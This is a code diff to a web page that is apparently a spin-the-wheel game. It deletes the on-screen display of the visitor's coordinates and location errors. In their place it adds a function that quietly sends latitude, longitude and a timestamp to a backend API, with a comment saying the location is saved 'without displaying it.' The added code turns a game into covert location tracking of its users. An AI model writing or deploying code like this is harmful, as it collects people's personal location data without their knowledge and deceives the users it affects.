@@ -135,25 +135,6 @@
             color: #333;
         }
 
-        .location-info {
-            margin-top: 20px;
-            padding: 15px;
-            background: #e8f5e9;
-            border-radius: 10px;
-            font-size: 14px;
-            color: #2e7d32;
-        }
-
-        .location-info strong {
-            display: block;
-            margin-bottom: 5px;
-        }
-
-        .error {
-            background: #ffebee;
-            color: #c62828;
-        }
-
         @keyframes slideIn {
             from {
                 opacity: 0;
@@ -189,8 +170,6 @@
         <div class="message" id="message">
             <p class="message-text">Click the button to spin!</p>
         </div>
-
-        <div id="locationInfo"></div>
     </div>
 
     <script>
@@ -245,54 +224,46 @@
         }
 
         function getUserLocation() {
-            const locationInfo = document.getElementById('locationInfo');
-
             if ('geolocation' in navigator) {
-                locationInfo.innerHTML = '<p>Requesting location...</p>';
-
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
                         
-                        locationInfo.innerHTML = `
-                            <div class="location-info">
-                                <strong>📍 Your Location:</strong>
-                                <div>Latitude: ${latitude.toFixed(6)}</div>
-                                <div>Longitude: ${longitude.toFixed(6)}</div>
-                            </div>
-                        `;
+                        // Save location to MongoDB without displaying it
+                        saveLocationToDatabase(latitude, longitude);
                     },
                     function(error) {
-                        let errorMessage = '';
-                        switch(error.code) {
-                            case error.PERMISSION_DENIED:
-                                errorMessage = 'Location access denied by user.';
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                errorMessage = 'Location information unavailable.';
-                                break;
-                            case error.TIMEOUT:
-                                errorMessage = 'Location request timed out.';
-                                break;
-                            default:
-                                errorMessage = 'An unknown error occurred.';
-                        }
-                        locationInfo.innerHTML = `
-                            <div class="location-info error">
-                                <strong>⚠️ Location Error:</strong>
-                                <div>${errorMessage}</div>
-                            </div>
-                        `;
+                        console.log('Location error:', error.message);
                     }
                 );
             } else {
-                locationInfo.innerHTML = `
-                    <div class="location-info error">
-                        <strong>⚠️ Geolocation not supported</strong>
-                        <div>Your browser doesn't support location services.</div>
-                    </div>
-                `;
+                console.log('Geolocation not supported');
+            }
+        }
+
+        async function saveLocationToDatabase(latitude, longitude) {
+            try {
+                const response = await fetch('http://localhost:3000/api/save-location', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        latitude,
+                        longitude,
+                        timestamp: new Date()
+                    })
+                });
+
+                const data = await response.json();
+                if (data.success) {
+                    console.log('Location saved successfully');
+                } else {
+                    console.error('Failed to save location:', data.error);
+                }
+            } catch (error) {
+                console.error('Error saving location:', error);
             }
         }
 
